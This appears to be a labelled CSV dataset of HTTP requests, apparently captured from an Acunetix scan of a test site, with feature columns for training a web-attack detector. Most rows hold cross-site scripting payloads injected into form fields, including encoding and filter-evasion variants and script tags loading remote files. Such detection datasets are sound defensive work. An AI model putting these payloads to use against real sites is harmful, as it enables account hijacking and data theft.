method,path,body,single_q,double_q,dashes,braces,spaces,url_length,body_length,base64_count,path_entropy,body_entropy,header_count,sql_injection_count,xss_attack_count,command_injection_count,directory_traversal_count,csrf_count,label
POST,/doSubscribe,"txtEmail=acu52440ca376420c120d78fe18c9271dc1&btnSubmit=Subscribe",0,0,0,0,0,12,65,0,3.418295834,4.66792012,11,0,0,0,0,0,0
POST,/doSubscribe,"txtEmail=111-222-1933email@address.tst&btnSubmit=acu8cd7f269878436e2c45195791e488163",0,0,0,0,0,12,85,0,3.418295834,4.757395166,11,0,0,0,0,0,0
GET,/doSubscribe,0,0,0,0,0,0,12,1,0,3.418295834,0,10,0,0,0,0,1,1
GET,/doSubscribe,0,0,0,0,0,0,12,1,0,3.418295834,0,9,0,0,0,0,0,0
GET,/index.jsp,0,0,0,0,0,0,10,1,0,3.321928095,0,9,0,0,0,0,0,0
GET,/doSubscribe,0,0,0,0,0,0,12,1,0,3.418295834,0,9,0,0,0,0,0,0
GET,/doSubscribe,0,0,0,0,0,0,12,1,0,3.418295834,0,10,0,0,0,0,0,0
GET,/doSubscribe,0,0,0,0,0,0,12,1,0,3.418295834,0,10,0,0,0,0,0,0
GET,/doSubscribe,0,0,0,0,0,0,12,1,0,3.418295834,0,10,0,0,0,0,0,0
POST,/sendFeedback,"cfile=acuaf28a4362acc8be330f234f0b49d4092&name=Acunetix&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,0,0,13,188,0,3.180832987,4.701255263,11,0,0,0,0,0,0
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=acua50bcdae6144812da06b016853b44028",0,0,0,0,0,13,194,0,3.180832987,4.720849639,11,0,0,0,0,0,0
GET,/sendFeedback,0,0,0,0,0,0,13,1,0,3.180832987,0,10,0,0,0,0,1,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=acua281497ddd257f8261452d8013fd37fc&submit=Submit",0,0,0,0,0,13,171,0,3.180832987,4.789553765,11,0,0,0,0,0,0
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=111-222-1933email@address.tst&subject=acu61a4b084aa0d69814cbe9e3d0ba4cef7&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,0,0,13,171,0,3.180832987,4.761277631,11,0,0,0,0,0,0
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=acub4919e1cb249743fc4dd8c326db9e6c1&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,0,0,13,171,0,3.180832987,4.717350629,11,0,0,0,0,0,0
POST,/sendFeedback,"cfile=comments.txt&name=acu678d2c95abae5ae4b802958f587158e3&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,0,0,13,192,0,3.180832987,4.716926268,11,0,0,0,0,0,0
GET,/sendFeedback,0,0,0,0,0,0,13,1,0,3.180832987,0,9,0,0,0,0,0,0
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=<script>alert(458065950025)</script>&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,1,0,13,172,0,3.180832987,4.900321791,11,0,7,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=<ScRiPt 
>alert(458075950025);</ScRiPt>&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,1,1,13,176,0,3.180832987,5.039505293,11,0,6,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=>'><ScRiPt 
>alert(458085950025);</ScRiPt>&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",1,0,0,1,1,13,179,0,3.180832987,5.059754139,11,0,8,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=>""><ScRiPt 
>alert(458095950025);</ScRiPt>&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,1,0,1,1,13,179,0,3.180832987,5.052798203,11,0,8,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=</textarea><ScRiPt 
>alert(458105950025);</ScRiPt>&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,1,1,13,187,0,3.180832987,5.008408522,11,0,8,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=</title><ScRiPt 
>alert(458115950025);</ScRiPt>&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,1,1,13,184,0,3.180832987,4.999426261,11,0,8,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=--><ScRiPt 
>alert(458125950025);</ScRiPt>&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,1,1,1,13,179,0,3.180832987,5.012895952,11,0,7,0,0,0,1
GET,/sendFeedback,0,0,0,0,0,0,13,1,0,3.180832987,0,9,0,0,0,0,0,0
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=email@some<ScRiPt 
>alert(458135950025);</ScRiPt>domain.com&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,1,1,13,196,0,3.180832987,4.977740308,11,0,6,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=[img]JaVaScRiPt:alert(458145950025)[/img]&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,1,0,13,177,0,3.180832987,4.997583009,11,0,2,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=<img src=""JaVaS&#99;RiPt:alert(458155950025);"">&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,2,0,1,1,13,183,0,3.180832987,5.054013629,11,0,4,0,0,0,1
GET,/sendFeedback,0,0,0,0,0,0,13,1,0,3.180832987,0,10,0,0,0,0,0,0
GET,/sendFeedback,0,0,0,0,0,0,13,1,0,3.180832987,0,10,0,0,0,0,0,0
GET,/sendFeedback,0,0,0,0,0,0,13,1,0,3.180832987,0,10,0,0,0,0,0,0
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=<script>alert(458195950445);</script>&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,1,0,13,174,0,3.180832987,4.925156612,11,0,6,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=<DIV STYLE=""width:expression(alert(458215950445));"">&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,2,0,2,1,13,188,0,3.180832987,5.153336726,11,0,3,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=<FRAMESET><FRAME SRC=""JaVaS&#99;RiPt:alert(458225950445);""></FRAMESET>&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,2,0,1,1,13,206,0,3.180832987,5.309833286,11,2,7,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=<scrip<script>t>alert(458205950445);</scrip</script>t>&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,1,0,13,190,0,3.180832987,4.914478733,11,0,11,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=<img dynsrc=""JaVaScRiPt:alert(458235950445);"">&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,2,0,1,1,13,182,0,3.180832987,5.047067658,11,0,4,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=JaVaS&#99;RiPt:alert(458245950445);"">&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,4,0,1,2,13,215,0,3.180832987,5.36434346,11,0,3,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=<iframe src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgnYWN1bmV0aXgteHNzLXRlc3QnKTwvc2NyaXB0Pgo="" invalid=""458255950445"">&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,4,0,0,2,13,256,0,3.180832987,5.42763117,11,1,4,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=<embed src=""http://testphp.acunetix.com/xss.swf?458265950445"" type=""application/x-shockwave-flash""/>&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,4,0,0,2,13,236,0,3.180832987,5.071936566,11,0,2,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=<body onload=alert(458275950445)>&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,1,1,13,169,0,3.180832987,4.908213128,11,0,3,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=<ScRiPt src=http://testphp.acunetix.com/xss.js?458285950445></ScRiPt>&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,0,1,13,205,0,3.180832987,5.018051938,11,0,5,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=<img src=http://testphp.acunetix.com/dot.gif onload=alert(458305950914)>&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,1,2,13,208,0,3.180832987,4.985139463,11,0,4,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=<script/xss src=http://testphp.acunetix.com/xss.js?458295950914></script>&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,0,1,13,209,0,3.180832987,4.913516853,11,0,5,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=' style='background:url(JaVaScRiPt:alert(458315950914))' invalidparam='&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",4,0,0,2,2,13,207,0,3.180832987,5.056412856,11,0,2,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=%3CScRiPt%3Ealert(458325950915);%3C/ScRiPt%3E&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,1,0,13,181,0,3.180832987,4.983514902,11,0,1,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=<ScRiPt bad="">"" src=""http://testphp.acunetix.com/xss.js?458335950915""></ScRiPt>&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,4,0,0,2,13,215,0,3.180832987,5.055169879,11,0,6,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr="" onmouseover=alert(458345950915) &subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,1,0,1,2,13,170,0,3.180832987,4.852009033,11,0,1,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=</div><ScRiPt 
>alert(458355950915);</ScRiPt>&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,1,1,13,182,0,3.180832987,5.044357304,11,0,8,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html;charset=UTF-7""></HEAD>+ADw-ScRiPt+AD4-alert(458365950915)+ADsAPA-/ScRiPt+AD4-&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,4,0,1,2,13,270,0,3.180832987,5.499298274,11,2,7,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr='""><ScRiPt 
>alert(458375950915);</ScRiPt>&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",1,1,0,1,1,13,180,0,3.180832987,5.096578642,11,0,7,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=""'><ScRiPt 
>alert(458385950915);</ScRiPt>&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",1,1,0,1,1,13,180,0,3.180832987,5.085467531,11,0,7,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=<script>alert(458395951156)</script>&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,1,0,13,193,0,3.180832987,4.774194743,11,0,7,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=<ScRiPt 
>alert(458405951156);</ScRiPt>&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,1,1,13,197,0,3.180832987,4.93987581,11,0,6,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=>'><ScRiPt 
>alert(458415951156);</ScRiPt>&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",1,0,0,1,1,13,200,0,3.180832987,4.94541087,11,0,8,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=>""><ScRiPt 
>alert(458425951156);</ScRiPt>&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,1,0,1,1,13,200,0,3.180832987,4.948463041,11,0,8,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=</textarea><ScRiPt 
>alert(458435951156);</ScRiPt>&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,1,1,13,208,0,3.180832987,4.924974071,11,0,8,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=</title><ScRiPt 
>alert(458445951156);</ScRiPt>&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,1,1,13,205,0,3.180832987,4.929524469,11,0,8,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=--><ScRiPt 
>alert(458455951157);</ScRiPt>&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,1,1,1,13,200,0,3.180832987,4.927639056,11,0,7,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=[img]JaVaScRiPt:alert(458475951157)[/img]&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,1,0,13,198,0,3.180832987,4.907744477,11,0,2,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=email@some<ScRiPt 
>alert(458465951157);</ScRiPt>domain.com&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,1,1,13,217,0,3.180832987,4.920629012,11,0,6,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=<img src=""JaVaS&#99;RiPt:alert(458485951157);"">&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,2,0,1,1,13,204,0,3.180832987,4.967758243,11,0,4,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=PFNjUmlQdD5hbGVydCgneHNzLXRlc3QnKTs8L1NjUmlQdD4=&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,0,0,13,184,0,3.180832987,5.163235711,11,0,0,0,0,0,0
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=Pic PFNjUmlQdD5hbGVydCgneHNzLXRlc3QnKTs8L1NjUmlQdD4=&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,0,1,13,188,0,3.180832987,5.188683245,11,0,0,0,0,0,0
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=PiI PFNjUmlQdD5hbGVydCgneHNzLXRlc3QnKTs8L1NjUmlQdD4=&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,0,1,13,188,0,3.180832987,5.210713614,11,0,0,0,0,0,0
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=IiBvbm1vdXNlb3Zlcj0iYWxlcnQoJ3hzcy10ZXN0Jyk=&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,0,0,13,180,0,3.180832987,5.045609878,11,0,0,0,0,0,0
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=ACUstart458535951159'"";ACUend&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",1,1,0,0,0,13,165,0,3.180832987,4.836320927,11,0,0,0,0,0,0
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=%uff1e%uff02%uff1exxx%uff1cscript%uff1ealert(458545951159);%uff1c/script%uff1e&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,1,0,13,214,0,3.180832987,4.833342793,11,0,1,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=%uff1e%uff07%uff1exxx%uff1cscript%uff1ealert(458555951159);%uff1c/script%uff1e&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,1,0,13,214,0,3.180832987,4.843817442,11,0,1,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=</xss/*-*/style=xss:e/**/xpression(alert(458565951159))>&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,2,0,13,192,0,3.180832987,4.943533575,11,0,3,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=javascript:alert(458575951159)&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,1,0,13,166,0,3.180832987,4.820692766,11,0,2,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=;acunetix:expr/**/ession(alert(458585951159));&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,2,0,13,182,0,3.180832987,4.901834038,11,0,1,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=<script>alert(458595951463);</script>&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,1,0,13,195,0,3.180832987,4.834369441,11,0,6,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=<scrip<script>t>alert(458605951463);</scrip</script>t>&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,1,0,13,211,0,3.180832987,4.85518798,11,0,11,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=<DIV STYLE=""width:expression(alert(458615951463));"">&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,2,0,2,1,13,209,0,3.180832987,5.06051501,11,0,3,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=<FRAMESET><FRAME SRC=""JaVaS&#99;RiPt:alert(458625951464);""></FRAMESET>&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,2,0,1,1,13,227,0,3.180832987,5.239959189,11,2,7,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=<img dynsrc=""JaVaScRiPt:alert(458635951464);"">&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,2,0,1,1,13,203,0,3.180832987,4.963508417,11,0,4,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=JaVaS&#99;RiPt:alert(458645951464);"">&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,4,0,1,2,13,236,0,3.180832987,5.294852327,11,0,3,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=<iframe src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgnYWN1bmV0aXgteHNzLXRlc3QnKTwvc2NyaXB0Pgo="" invalid=""458655951464"">&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,4,0,0,2,13,277,0,3.180832987,5.364557007,11,1,4,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=<embed src=""http://testphp.acunetix.com/xss.swf?458665951464"" type=""application/x-shockwave-flash""/>&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,4,0,0,2,13,257,0,3.180832987,5.015731202,11,0,2,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=<body onload=alert(458675951464)>&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,1,1,13,190,0,3.180832987,4.82617827,11,0,3,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=<ScRiPt src=http://testphp.acunetix.com/xss.js?458685951464></ScRiPt>&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,0,1,13,226,0,3.180832987,4.967908168,11,0,5,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=Acunetix&email_addr=<iframe/ /onload=alert(458695951724)></iframe>&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,1,1,13,182,0,3.180832987,4.918029386,11,0,5,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=<script/xss src=http://testphp.acunetix.com/xss.js?458705951790></script>&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,0,1,13,230,0,3.180832987,4.891084571,11,0,5,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=<img src=http://testphp.acunetix.com/dot.gif onload=alert(458715951790)>&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,1,2,13,229,0,3.180832987,4.928119446,11,0,4,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=' style='background:url(JaVaScRiPt:alert(458725951790))' invalidparam='&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",4,0,0,2,2,13,228,0,3.180832987,5.00328071,11,0,2,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=<ScRiPt bad="">"" src=""http://testphp.acunetix.com/xss.js?458745951790""></ScRiPt>&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,4,0,0,2,13,236,0,3.180832987,5.030184321,11,0,6,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=%3CScRiPt%3Ealert(458735951790);%3C/ScRiPt%3E&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,1,0,13,202,0,3.180832987,4.925043552,11,0,1,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name="" onmouseover=alert(458755951790) &email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,1,0,1,2,13,191,0,3.180832987,4.793324459,11,0,1,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=</div><ScRiPt 
>alert(458765951790);</ScRiPt>&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,1,1,13,203,0,3.180832987,5.003833429,11,0,8,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html;charset=UTF-7""></HEAD>+ADw-ScRiPt+AD4-alert(458775951790)+ADsAPA-/ScRiPt+AD4-&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,4,0,1,2,13,291,0,3.180832987,5.448816588,11,2,7,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name='""><ScRiPt 
>alert(458785951790);</ScRiPt>&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",1,1,0,1,1,13,201,0,3.180832987,5.022639568,11,0,7,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=""'><ScRiPt 
>alert(458795951790);</ScRiPt>&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",1,1,0,1,1,13,201,0,3.180832987,5.013186162,11,0,7,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=PFNjUmlQdD5hbGVydCgneHNzLXRlc3QnKTs8L1NjUmlQdD4=&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,0,0,13,205,0,3.180832987,5.07137909,11,0,0,0,0,0,0
POST,/sendFeedback,"cfile=comments.txt&name=Pic PFNjUmlQdD5hbGVydCgneHNzLXRlc3QnKTs8L1NjUmlQdD4=&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,0,1,13,209,0,3.180832987,5.100137328,11,0,0,0,0,0,0
POST,/sendFeedback,"cfile=comments.txt&name=PiI PFNjUmlQdD5hbGVydCgneHNzLXRlc3QnKTs8L1NjUmlQdD4=&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,0,1,13,209,0,3.180832987,5.118798259,11,0,0,0,0,0,0
POST,/sendFeedback,"cfile=comments.txt&name=IiBvbm1vdXNlb3Zlcj0iYWxlcnQoJ3hzcy10ZXN0Jyk=&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,0,0,13,201,0,3.180832987,4.967085204,11,0,0,0,0,0,0
POST,/sendFeedback,"cfile=comments.txt&name=ACUstart458845952218'"";ACUend&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",1,1,0,0,0,13,186,0,3.180832987,4.782395206,11,0,0,0,0,0,0
POST,/sendFeedback,"cfile=comments.txt&name=%uff1e%uff02%uff1exxx%uff1cscript%uff1ealert(458855952218);%uff1c/script%uff1e&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,1,0,13,235,0,3.180832987,4.79814821,11,0,1,0,0,0,1
POST,/sendFeedback,"cfile=comments.txt&name=%uff1e%uff07%uff1exxx%uff1cscript%uff1ealert(458865952219);%uff1c/script%uff1e&email_addr=111-222-1933email@address.tst&subject=111-222-1933email@address.tst&comments=111-222-1933email@address.tst&submit=Submit",0,0,0,1,0,13,235,0,3.180832987,4.829451026,11,0,1,0,0,0,1
